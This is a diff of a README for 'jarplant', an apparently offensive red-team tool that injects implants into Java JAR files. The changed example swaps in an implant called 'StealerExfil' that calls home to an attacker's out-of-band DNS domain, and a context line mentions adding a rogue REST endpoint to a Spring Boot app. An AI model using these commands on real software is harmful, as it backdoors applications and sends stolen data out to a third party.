@@ -64,24 +64,24 @@ example usage:
 
 These are some examples of things you may be interested in.
 
-Spike any Java app or library to call home to an out-of-band DNS catcher (like Interactch or Burp Collaborator):
+Spike any Java app or library to call home to an out-of-band DNS catcher (like Interactch):
 
 ```shell
 java -jar jarplant.jar class-injector \
    --target path/to/target.jar \
-   --implant DnsBeaconImplant \
+   --implant StealerExfil \
    --config CONF_DOMAIN=$YOUR_OAST_DOMAIN 
 ```
 
-Replace `$YOUR_OAST_DOMAIN` with your `*.oast.fun` domain (or whatever out-of-band service you use).
+Replace `$YOUR_OAST_DOMAIN` with your `*.oast.fun` domain (or whatever out-of-band domain you use).
 
 Decode the domain name caught by your DNS server:
 
 ```shell
-java -jar jarplant.jar decoder $ENCODED_FQDN 
+java -jar jarplant.jar decoder --input $INTERACTSH.JSON --domain $YOUR_OAST_DOMAIN
 ```
 
-Replace `$ENCODED_FQDN` with the domain name in the DNS query.
+Replace `$YOUR_OAST_DOMAIN` with your interactsh domain and $INTERACTSH.JSON with a JSON export from interactsh.
 
 Spike a Spring Boot app to include a rogue REST endpoint:
 
